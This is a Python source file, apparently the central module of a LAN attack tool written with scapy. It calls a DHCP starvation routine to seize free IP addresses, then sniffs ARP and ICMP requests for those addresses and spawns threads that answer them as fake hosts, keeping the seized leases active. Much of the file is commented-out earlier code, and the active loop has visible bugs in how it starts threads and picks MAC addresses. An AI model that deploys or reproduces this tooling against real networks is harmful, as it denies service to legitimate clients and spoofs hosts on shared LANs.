#!/usr/bin/python3

# Import modules
import scapy.all as scapy
import fct_arp
import fct_icmp
import fct_starvation
import fct_responder
import threading
import time
import sys

#def listener_start(src_mac):
#    sniff_packet = scapy.AsyncSniffer(count=1,filter=f"udp and src port 67 and dst port 68 and ether dst {src_mac}", timeout=5)
#    sniff_packet.start()
#    time.sleep(0.1)
#    return sniff_packet
#
#def listener_join(sniff_packet):
#    sniff_packet.join()
#    dhcp_offer = sniff_packet.results
#    return dhcp_offer

#def listener_arp_start(ip):
#    sniff_packet = scapy.AsyncSniffer(count=1,filter=f"arp and arp[6:2] = 1 and host {ip}")
#    sniff_packet.start()
#    time.sleep(0.1)
#    return sniff_packet

#def arp_responder(ip, src_mac, interface):
#    while True:
#        sniff_packet = scapy.sniff(count=1,filter=f"arp and arp[6:2] = 1 and host {ip}")
#        if sniff_packet:
#            mac_src = sniff_packet[0][scapy.ARP].hwsrc
#            ip_dst = sniff_packet[0][scapy.ARP].pdst
#            ip_src = sniff_packet[0][scapy.ARP].psrc
#
#            print(f"[ARP] L'adresse MAC source est {mac_src} est recherche l'adresse IP {ip_dst}")
#            fct_arp.reply(mac_src, ip_dst, ip_src, src_mac, interface)

#def listener(ip, fake_host_mac, interface):
#
#    # Filtre
#    filter_1 = f"arp and arp[6:2] = 1 and host {ip}" # arp listener
#    filter_2 = f"icmp[icmptype] == 8 and dst {ip}" # icmp listener
#
#    while True:
#        sniff_packet = scapy.sniff(count=1,filter=f"{filter_1} or {filter_2}")
#        thread_responder = threading.Thread(target=fct_responder.responder(sniff_packet, fake_host_mac, interface), args=())
#        thread_responder.start()

def listener(free_ip, occuped_ip, interface):

    # DHCP Starvation
    reserved_ip = fct_starvation.starvation(free_ip, interface)

    # Filtre
    filter_1 = f"arp and arp[6:2] = 1" # arp who-has
    filter_2 = f"icmp[icmptype] == 8" # icmp request
    main_filter = ""

    for ip, mac in reserved_ip:
        if len(main_filter) != 0:
            main_filter = f"{main_filter} or {filter_1} and host {ip} or {filter_2} and dst {ip}"
        else:
            main_filter = f"{filter_1} and host {ip} or {filter_2} and dst {ip}"

    while True:
        sniff_packet = scapy.sniff(count=1,filter=f"{main_filter}")
#        if sniff_packet[0].haslayer(scapy.IP):
#            for ip, mac in reserved_ip:
#                if sniff_packet[0][scapy.IP].dst == ip:
        thread_responder = threading.Thread(target=fct_responder.responder(sniff_packet, mac, interface), args=())
        thread_responder.start()
#        elif sniff_packet[0].haslayer(scapy.Ether):
#            for ip, mac in reserved_ip:
#                if sniff_packet[0][scapy.Ether].dst == mac:
#            thread_responder = threading.Thread(target=fct_responder.responder(sniff_packet, mac, interface), args=())
#            thread_responder.start()

#                position = reserved_ip.index(sniff_packet[0][scapy.IP].dst)
#                thread_responder = threading.Thread(target=fct_responder.responder(sniff_packet, fake_host_mac, interface), args=())
#                thread_responder.start()
#            else:
#                # DHCP starvation
        

#def icmp_responder(ip, interface):
#    while True:
#        sniff_packet = scapy.sniff(count=1,filter=f"icmp[icmptype] == 8 and dst {ip}")
#        if sniff_packet:
#            mac_src = sniff_packet[0][scapy.Ether].src
#            mac_dst = sniff_packet[0][scapy.Ether].dst
#            ip_src = sniff_packet[0][scapy.IP].src
#            ip_dst = sniff_packet[0][scapy.IP].dst
#            xid = sniff_packet[0][scapy.ICMP].id
#            seq = sniff_packet[0][scapy.ICMP].seq
#            payload = sniff_packet[0][scapy.ICMP].payload
#    
#            print(f"[ICMP] L'adresse IP source est {ip_src} est requete l'adresse IP {ip_dst}")
#            fct_icmp.reply(mac_src, mac_dst, ip_src, ip_dst, xid, seq, payload, interface)
#
#def listener_arp_join(sniff_packet):
#    sniff_packet.join(timeout=0.2)
#    if sniff_packet.results != None:
#        result = sniff_packet.results
#        mac_src = result[0][scapy.ARP].hwsrc
#        ip_dst = result[0][scapy.ARP].pdst
#        ip_src = result[0][scapy.ARP].psrc
#        return mac_src, ip_dst, ip_src
#    else: 
#        mac_src = ""
#        ip_dst = ""
#        ip_src = ""
#        return mac_src, ip_dst, ip_src
#
#def listener_icmp_start(ip):
#    sniff_packet = scapy.AsyncSniffer(count=1,filter=f"icmp[icmptype] == 8 and dst {ip}")
#    sniff_packet.start()
#    time.sleep(0.1)
#    return sniff_packet
#
#def listener_icmp_join(sniff_packet):
#    sniff_packet.join(timeout=0.2)
#    if sniff_packet.results != None:
#        results = sniff_packet.results
#        mac_src = results[0][scapy.Ether].src
#        mac_dst = results[0][scapy.Ether].dst
#        ip_src = results[0][scapy.IP].src
#        ip_dst = results[0][scapy.IP].dst
#        xid = results[0][scapy.ICMP].id
#        seq = results[0][scapy.ICMP].seq
#        payload = results[0][scapy.ICMP].payload
#        return mac_src, mac_dst, ip_src, ip_dst, xid, seq, payload
#    else: 
#        mac_dst = ""
#        mac_src = ""
#        ip_dst = ""
#        ip_src = ""
#        xid = ""
#        seq = ""
#        payload = ""
#        return mac_src, mac_dst, ip_src, ip_dst, xid, seq, payload